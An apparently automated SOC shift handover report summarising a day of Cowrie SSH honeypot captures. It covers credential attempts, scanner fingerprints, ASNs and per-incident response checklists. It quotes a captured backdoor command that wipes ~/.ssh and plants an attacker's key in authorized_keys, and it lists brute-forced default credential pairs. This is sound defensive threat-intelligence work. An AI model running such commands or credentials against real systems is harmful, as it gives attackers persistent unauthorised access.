# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-14 |
| **Generated At** | 2026-08-14T09:13:15Z |
| **Shift Time** | 09:13 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **214** |
| Confirmed Threats | **188** |
| False Positives Filtered | **26** (12.2%) |
| Unique Attacker IPs | **87** |
| Countries of Origin | **30** |
| High Severity Cases | **137** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **77** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **157** |
| Unique Credential Pairs | **115** |
| Unique Usernames | **41** |
| Unique Passwords | **100** |
| Successful Auth Pairs | **149** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `test` | 17 |
| `admin` | 16 |
| `user` | 12 |
| `support` | 12 |
| `user1` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123` | 6 |
| `112233` | 6 |
| `dietpi` | 5 |
| `asdfgh` | 5 |
| `1234567` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `112233` | 6 |
| `test` | `asdfgh` | 5 |
| `nobody` | `1234567` | 5 |
| `config` | `123` | 5 |
| `ubnt` | `ubnt11` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `nobody` | `dietpi` | `210.245.95.11` | 2026-08-14T06:56:37 |
| `config` | `123123123` | `119.160.166.237` | 2026-08-14T06:59:16 |
| `config` | `123123123` | `45.236.19.9` | 2026-08-14T06:59:28 |
| `config` | `123123123` | `39.164.94.190` | 2026-08-14T06:59:39 |
| `user` | `159753` | `195.222.57.183` | 2026-08-14T07:02:08 |
| `root` | `zaq12wsxcde3` | `91.92.47.53` | 2026-08-14T07:07:04 |
| `test` | `987654321` | `91.92.47.53` | 2026-08-14T07:07:10 |
| `support` | `support` | `176.53.159.196` | 2026-08-14T07:07:11 |
| `azure` | `1` | `91.92.47.53` | 2026-08-14T07:07:15 |
| `jasdeep` | `jasdeep123` | `91.92.47.53` | 2026-08-14T07:07:20 |
| `weblogic` | `password123` | `91.92.47.53` | 2026-08-14T07:07:25 |
| `guest` | `guest123456789` | `91.92.47.53` | 2026-08-14T07:07:30 |
| `web` | `password12345678` | `91.92.47.53` | 2026-08-14T07:07:34 |
| `test` | `123123` | `91.92.47.53` | 2026-08-14T07:07:39 |
| `samurai` | `samurai` | `91.92.47.53` | 2026-08-14T07:07:44 |
| `admin` | `120790` | `91.92.47.53` | 2026-08-14T07:07:49 |
| `root` | `alpine` | `91.92.47.53` | 2026-08-14T07:07:54 |
| `test` | `12` | `91.92.47.53` | 2026-08-14T07:07:59 |
| `user` | `1qazxsw2` | `91.92.47.53` | 2026-08-14T07:08:04 |
| `backup` | `54321` | `91.92.47.53` | 2026-08-14T07:08:09 |
| `user2` | `omn` | `91.92.47.53` | 2026-08-14T07:08:15 |
| `user1` | `password123` | `91.92.47.53` | 2026-08-14T07:08:20 |
| `support` | `support8` | `91.92.47.53` | 2026-08-14T07:08:25 |
| `centos` | `centos123` | `91.92.47.53` | 2026-08-14T07:08:30 |
| `supervisor` | `supervisor77` | `91.92.47.53` | 2026-08-14T07:08:35 |
| `jason` | `admin` | `91.92.47.53` | 2026-08-14T07:08:40 |
| `test` | `password1234` | `91.92.47.53` | 2026-08-14T07:08:45 |
| `user1` | `!QAZ@WSX` | `91.92.47.53` | 2026-08-14T07:08:51 |
| `user0` | `1qaz@wsx` | `91.92.47.53` | 2026-08-14T07:08:55 |
| `user3` | `1qaz2wsx3edc4rfv` | `91.92.47.53` | 2026-08-14T07:09:00 |
| `hos` | `123` | `91.92.47.53` | 2026-08-14T07:09:05 |
| `test` | `QAZ@WSX` | `91.92.47.53` | 2026-08-14T07:09:10 |
| `dockeruser` | `12345` | `91.92.47.53` | 2026-08-14T07:09:16 |
| `admin` | `11101994` | `91.92.47.53` | 2026-08-14T07:09:21 |
| `support` | `qwertyuiop` | `91.92.47.53` | 2026-08-14T07:09:26 |
| `support` | `admin` | `91.92.47.53` | 2026-08-14T07:09:30 |
| `test` | `password12345678` | `91.92.47.53` | 2026-08-14T07:09:36 |
| `user` | `password123456` | `91.92.47.53` | 2026-08-14T07:09:41 |
| `weblogic` | `weblogic1` | `91.92.47.53` | 2026-08-14T07:09:45 |
| `user3` | `lobby01` | `91.92.47.53` | 2026-08-14T07:09:50 |
| `user` | `password1234567` | `91.92.47.53` | 2026-08-14T07:09:55 |
| `weblogic` | `QAZ2wsx` | `91.92.47.53` | 2026-08-14T07:09:59 |
| `root` | `@` | `91.92.47.53` | 2026-08-14T07:10:05 |
| `user` | `password12345` | `91.92.47.53` | 2026-08-14T07:10:10 |
| `test` | `1q2w3e` | `91.92.47.53` | 2026-08-14T07:10:15 |
| `supervisor` | `supervisor33` | `91.92.47.53` | 2026-08-14T07:10:19 |
| `weblogic` | `password12` | `91.92.47.53` | 2026-08-14T07:10:24 |
| `user` | `zcadqe` | `91.92.47.53` | 2026-08-14T07:10:29 |
| `user` | `qwe123` | `91.92.47.53` | 2026-08-14T07:10:34 |
| `Root` | `444444444` | `91.92.47.53` | 2026-08-14T07:10:39 |
| `user1` | `user112` | `91.92.47.53` | 2026-08-14T07:10:43 |
| `web` | `password123456789` | `91.92.47.53` | 2026-08-14T07:10:48 |
| `Root` | `Root2010` | `91.92.47.53` | 2026-08-14T07:10:53 |
| `weblogic` | `123456` | `91.92.47.53` | 2026-08-14T07:10:58 |
| `user` | `123qwe` | `91.92.47.53` | 2026-08-14T07:11:02 |
| `user1` | `password1` | `91.92.47.53` | 2026-08-14T07:11:07 |
| `guest` | `qwerty12` | `91.92.47.53` | 2026-08-14T07:11:12 |
| `user1` | `1qaz3edc` | `91.92.47.53` | 2026-08-14T07:11:18 |
| `user3` | `ZAQ!XSW@` | `91.92.47.53` | 2026-08-14T07:11:22 |
| `test` | `1234` | `91.92.47.53` | 2026-08-14T07:11:27 |
| `frappe` | `admin@123` | `91.92.47.53` | 2026-08-14T07:11:32 |
| `root` | `1qaz321x` | `91.92.47.53` | 2026-08-14T07:11:36 |
| `admin` | `nosoup4u` | `91.92.47.53` | 2026-08-14T07:11:41 |
| `user` | `000` | `91.92.47.53` | 2026-08-14T07:11:46 |
| `operator` | `operator33` | `91.92.47.53` | 2026-08-14T07:11:50 |
| `user1` | `ZAQ!XSW@` | `91.92.47.53` | 2026-08-14T07:11:55 |
| `usuario` | `12345678` | `91.92.47.53` | 2026-08-14T07:12:00 |
| `frappe` | `frappe24` | `91.92.47.53` | 2026-08-14T07:12:05 |
| `user1` | `zcadqe` | `91.92.47.53` | 2026-08-14T07:12:10 |
| `root` | `7ujMko0admin123` | `91.92.47.53` | 2026-08-14T07:12:16 |
| `aluno` | `aluno` | `91.92.47.53` | 2026-08-14T07:12:21 |
| `web` | `123456789` | `91.92.47.53` | 2026-08-14T07:12:26 |
| `user2` | `1qaz2wsx3edc4rfv` | `91.92.47.53` | 2026-08-14T07:12:31 |
| `admin` | `100581` | `91.92.47.53` | 2026-08-14T07:12:36 |
| `apache` | `Apache123` | `91.92.47.53` | 2026-08-14T07:12:41 |
| `user1` | `lobby01` | `91.92.47.53` | 2026-08-14T07:12:46 |
| `root` | `osm` | `91.92.47.53` | 2026-08-14T07:12:51 |
| `admin` | `admin123!@#` | `91.92.47.53` | 2026-08-14T07:12:56 |
| `web` | `web` | `91.92.47.53` | 2026-08-14T07:13:01 |
| `user` | `lobby01` | `91.92.47.53` | 2026-08-14T07:13:06 |
| `admin` | `0l0ctyQh243O63uD` | `91.92.47.53` | 2026-08-14T07:13:11 |
| `web` | `password1` | `91.92.47.53` | 2026-08-14T07:13:16 |
| `supervisor` | `supervisor1234567` | `91.92.47.53` | 2026-08-14T07:13:21 |
| `web` | `password1234567` | `91.92.47.53` | 2026-08-14T07:13:26 |
| `test` | `1234567890` | `91.92.47.53` | 2026-08-14T07:13:31 |
| `ubnt` | `jackson` | `91.92.47.53` | 2026-08-14T07:13:36 |
| `test` | `test!@` | `91.92.47.53` | 2026-08-14T07:13:41 |
| `user` | `159753` | `10.0.0.73` | 2026-08-14T07:13:42 |
| `corrina` | `corrina` | `91.92.47.53` | 2026-08-14T07:13:46 |
| `user1` | `1qaz2wsx3edc` | `91.92.47.53` | 2026-08-14T07:13:51 |
| `samba` | `samba` | `91.92.47.53` | 2026-08-14T07:13:56 |
| `root` | `asdfghjkl` | `91.92.47.53` | 2026-08-14T07:14:01 |
| `blank` | `blank22` | `91.92.47.53` | 2026-08-14T07:14:06 |
| `bench` | `bench` | `91.92.47.53` | 2026-08-14T07:14:11 |
| `admin` | `12` | `91.92.47.53` | 2026-08-14T07:14:16 |
| `user2` | `lobby01` | `91.92.47.53` | 2026-08-14T07:14:21 |
| `julian` | `julian` | `91.92.47.53` | 2026-08-14T07:14:26 |
| `web` | `web1` | `91.92.47.53` | 2026-08-14T07:14:31 |
| `weblogic` | `!QAZ2wsx` | `91.92.47.53` | 2026-08-14T07:14:36 |
| `test` | `asdfgh` | `10.0.0.73` | 2026-08-14T07:14:52 |
| `admin` | `A1b2c3d4` | `10.0.0.73` | 2026-08-14T07:21:42 |
| `admin` | `A1b2c3d4` | `78.187.230.168` | 2026-08-14T07:23:24 |
| `user` | `159753` | `65.20.204.88` | 2026-08-14T07:30:41 |
| `support` | `support` | `10.0.0.73` | 2026-08-14T07:32:12 |
| `test` | `asdfgh` | `113.108.88.121` | 2026-08-14T07:33:20 |
| `test` | `asdfgh` | `81.214.75.248` | 2026-08-14T07:33:28 |
| `test` | `asdfgh` | `85.105.255.56` | 2026-08-14T07:33:36 |
| `nobody` | `1234567` | `65.20.163.103` | 2026-08-14T07:35:50 |
| `nobody` | `1234567` | `179.181.133.153` | 2026-08-14T07:36:00 |
| `admin` | `admin` | `47.77.182.54` | 2026-08-14T07:36:49 |
| `admin` | `A1b2c3d4` | `78.189.17.35` | 2026-08-14T07:39:29 |
| `nobody` | `1234567` | `10.0.0.73` | 2026-08-14T07:47:35 |
| `config` | `123` | `10.0.0.73` | 2026-08-14T07:48:46 |
| `ubnt` | `ubnt11` | `10.0.0.73` | 2026-08-14T07:56:08 |
| `ubnt` | `ubnt11` | `87.225.108.138` | 2026-08-14T07:57:23 |
| `ubnt` | `ubnt11` | `210.206.24.237` | 2026-08-14T07:57:32 |
| `nobody` | `1234567` | `196.203.231.220` | 2026-08-14T08:04:52 |
| `config` | `123` | `121.189.198.60` | 2026-08-14T08:07:15 |
| `config` | `123` | `45.118.49.18` | 2026-08-14T08:07:30 |
| `config` | `123` | `81.172.74.163` | 2026-08-14T08:07:40 |
| `support` | `112233` | `124.160.45.26` | 2026-08-14T08:10:05 |
| `support` | `112233` | `203.193.147.75` | 2026-08-14T08:10:17 |
| `admin` | `admin55` | `10.0.0.73` | 2026-08-14T08:10:53 |
| `jboss` | `jboss` | `107.180.88.176` | 2026-08-14T08:13:24 |
| `345gs5662d34` | `345gs5662d34` | `107.180.88.176` | 2026-08-14T08:13:26 |
| `jboss` | `3245gs5662d34` | `107.180.88.176` | 2026-08-14T08:13:26 |
| `ubnt` | `ubnt11` | `220.189.209.18` | 2026-08-14T08:13:37 |
| `ubnt` | `ubnt11` | `195.222.57.190` | 2026-08-14T08:13:45 |
| `support` | `112233` | `10.0.0.73` | 2026-08-14T08:21:35 |
| `2` | `2` | `10.0.0.73` | 2026-08-14T08:22:58 |
| `test` | `654321` | `85.152.57.60` | 2026-08-14T08:24:03 |
| `test` | `654321` | `223.197.145.33` | 2026-08-14T08:24:11 |
| `vyos` | `vyos` | `59.120.8.61` | 2026-08-14T08:24:46 |
| `vyos` | `vyos` | `181.212.174.164` | 2026-08-14T08:24:53 |
| `blank` | `dietpi` | `10.0.0.73` | 2026-08-14T08:29:47 |
| `blank` | `dietpi` | `117.205.2.250` | 2026-08-14T08:31:26 |
| `nobody` | `password321` | `95.79.57.221` | 2026-08-14T08:36:30 |
| `nobody` | `password321` | `85.105.2.51` | 2026-08-14T08:36:36 |
| `support` | `112233` | `87.103.126.54` | 2026-08-14T08:38:43 |
| `support` | `112233` | `45.178.227.0` | 2026-08-14T08:38:51 |
| `2` | `2` | `178.216.165.187` | 2026-08-14T08:41:15 |
| `2` | `2` | `122.160.85.144` | 2026-08-14T08:41:24 |
| `2` | `2` | `117.247.239.202` | 2026-08-14T08:41:30 |
| `2` | `2` | `177.135.206.10` | 2026-08-14T08:41:39 |
| `unknown` | `123321` | `122.187.147.13` | 2026-08-14T08:44:02 |
| `admin` | `admin` | `114.33.12.13` | 2026-08-14T08:46:47 |
| `debian` | `temppwd` | `10.0.0.73` | 2026-08-14T08:47:29 |
| `blank` | `dietpi` | `220.93.167.144` | 2026-08-14T08:47:32 |
| `blank` | `dietpi` | `150.117.7.72` | 2026-08-14T08:47:42 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **214** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 95 |
| OpenSSH | 46 |
| libssh | 11 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 92 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 41 | 41 |
| `a984ff804585...` | libssh-based | 5 | 1 |
| `f555226df196...` | Mirai/variant | 3 | 1 |
| `a704be057881...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 92 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 41 | 41 | Mirai/variant |
| `95420f9d932d...` | libssh | 8 | 4 | — |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `a704be057881...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1592, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
sh
```
```
shell
```
```
enable
```
```
system
```
```
ping; sh
```
Source IPs: `114.33.12.13`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `107.180.88.176`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **87** |
| Unique ASNs | **65** |
| High-Risk ASNs | **53** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 5 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS396982` | Google LLC | 3 | LOW |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS18881` | TELEFÔNICA BRASIL S.A | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS7303` | Telecom Argentina S.A. | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (136)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-415e5e3e087d

| Field | Detail |
|---|---|
| **Source IP** | `210.245.95[.]11` |
| **First Seen** | 2026-08-14 06:56 |
| **Last Seen** | 2026-08-14 06:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 06:56:34` | `cowrie.session.connect` |
| `2026-08-14 06:56:34` | `cowrie.client.version` |
| `2026-08-14 06:56:34` | `cowrie.client.kex` |
| `2026-08-14 06:56:37` | `cowrie.login.success` |
| `2026-08-14 06:56:37` | `cowrie.direct-tcpip.request` |
| `2026-08-14 06:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.245.95[.]11` to AbuseIPDB if not already reported
- [ ] Block `210.245.95[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78bc57c182ab

| Field | Detail |
|---|---|
| **Source IP** | `119.160.166[.]237` |
| **First Seen** | 2026-08-14 06:59 |
| **Last Seen** | 2026-08-14 06:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 06:59:13` | `cowrie.session.connect` |
| `2026-08-14 06:59:14` | `cowrie.client.version` |
| `2026-08-14 06:59:14` | `cowrie.client.kex` |
| `2026-08-14 06:59:16` | `cowrie.login.success` |
| `2026-08-14 06:59:17` | `cowrie.direct-tcpip.request` |
| `2026-08-14 06:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.160.166[.]237` to AbuseIPDB if not already reported
- [ ] Block `119.160.166[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6fd2ec52cde

| Field | Detail |
|---|---|
| **Source IP** | `39.164.94[.]190` |
| **First Seen** | 2026-08-14 06:59 |
| **Last Seen** | 2026-08-14 06:59 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 06:59:34` | `cowrie.session.connect` |
| `2026-08-14 06:59:37` | `cowrie.client.version` |
| `2026-08-14 06:59:37` | `cowrie.client.kex` |
| `2026-08-14 06:59:39` | `cowrie.login.success` |
| `2026-08-14 06:59:41` | `cowrie.direct-tcpip.request` |
| `2026-08-14 06:59:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.164.94[.]190` to AbuseIPDB if not already reported
- [ ] Block `39.164.94[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f762f77ab5af

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]183` |
| **First Seen** | 2026-08-14 07:02 |
| **Last Seen** | 2026-08-14 07:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:02:07` | `cowrie.session.connect` |
| `2026-08-14 07:02:07` | `cowrie.client.version` |
| `2026-08-14 07:02:07` | `cowrie.client.kex` |
| `2026-08-14 07:02:08` | `cowrie.login.success` |
| `2026-08-14 07:02:08` | `cowrie.direct-tcpip.request` |
| `2026-08-14 07:02:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]183` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4776cc6cef52

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:07 |
| **Last Seen** | 2026-08-14 07:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:07:03` | `cowrie.session.connect` |
| `2026-08-14 07:07:03` | `cowrie.client.version` |
| `2026-08-14 07:07:03` | `cowrie.client.kex` |
| `2026-08-14 07:07:04` | `cowrie.login.success` |
| `2026-08-14 07:07:05` | `cowrie.session.params` |
| `2026-08-14 07:07:05` | `cowrie.command.input` |
| `2026-08-14 07:07:05` | `cowrie.log.closed` |
| `2026-08-14 07:07:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84e81a27a17d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:07 |
| **Last Seen** | 2026-08-14 07:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:07:08` | `cowrie.session.connect` |
| `2026-08-14 07:07:09` | `cowrie.client.version` |
| `2026-08-14 07:07:09` | `cowrie.client.kex` |
| `2026-08-14 07:07:10` | `cowrie.login.success` |
| `2026-08-14 07:07:11` | `cowrie.session.params` |
| `2026-08-14 07:07:11` | `cowrie.command.input` |
| `2026-08-14 07:07:12` | `cowrie.log.closed` |
| `2026-08-14 07:07:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d21c3adab1f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-14 07:07 |
| **Last Seen** | 2026-08-14 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:07:10` | `cowrie.session.connect` |
| `2026-08-14 07:07:10` | `cowrie.client.version` |
| `2026-08-14 07:07:10` | `cowrie.client.kex` |
| `2026-08-14 07:07:11` | `cowrie.login.success` |
| `2026-08-14 07:07:11` | `cowrie.direct-tcpip.request` |
| `2026-08-14 07:07:11` | `cowrie.direct-tcpip.data` |
| `2026-08-14 07:07:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e71138e8d9d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:07 |
| **Last Seen** | 2026-08-14 07:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:07:14` | `cowrie.session.connect` |
| `2026-08-14 07:07:14` | `cowrie.client.version` |
| `2026-08-14 07:07:14` | `cowrie.client.kex` |
| `2026-08-14 07:07:15` | `cowrie.login.success` |
| `2026-08-14 07:07:17` | `cowrie.session.params` |
| `2026-08-14 07:07:17` | `cowrie.command.input` |
| `2026-08-14 07:07:17` | `cowrie.log.closed` |
| `2026-08-14 07:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c72acb7e050

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:07 |
| **Last Seen** | 2026-08-14 07:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:07:19` | `cowrie.session.connect` |
| `2026-08-14 07:07:19` | `cowrie.client.version` |
| `2026-08-14 07:07:19` | `cowrie.client.kex` |
| `2026-08-14 07:07:20` | `cowrie.login.success` |
| `2026-08-14 07:07:21` | `cowrie.session.params` |
| `2026-08-14 07:07:21` | `cowrie.command.input` |
| `2026-08-14 07:07:21` | `cowrie.log.closed` |
| `2026-08-14 07:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e18709011ba1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:07 |
| **Last Seen** | 2026-08-14 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:07:24` | `cowrie.session.connect` |
| `2026-08-14 07:07:24` | `cowrie.client.version` |
| `2026-08-14 07:07:24` | `cowrie.client.kex` |
| `2026-08-14 07:07:25` | `cowrie.login.success` |
| `2026-08-14 07:07:25` | `cowrie.session.params` |
| `2026-08-14 07:07:25` | `cowrie.command.input` |
| `2026-08-14 07:07:25` | `cowrie.log.closed` |
| `2026-08-14 07:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89e61e513a95

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:07 |
| **Last Seen** | 2026-08-14 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:07:29` | `cowrie.session.connect` |
| `2026-08-14 07:07:29` | `cowrie.client.version` |
| `2026-08-14 07:07:29` | `cowrie.client.kex` |
| `2026-08-14 07:07:30` | `cowrie.login.success` |
| `2026-08-14 07:07:31` | `cowrie.session.params` |
| `2026-08-14 07:07:31` | `cowrie.command.input` |
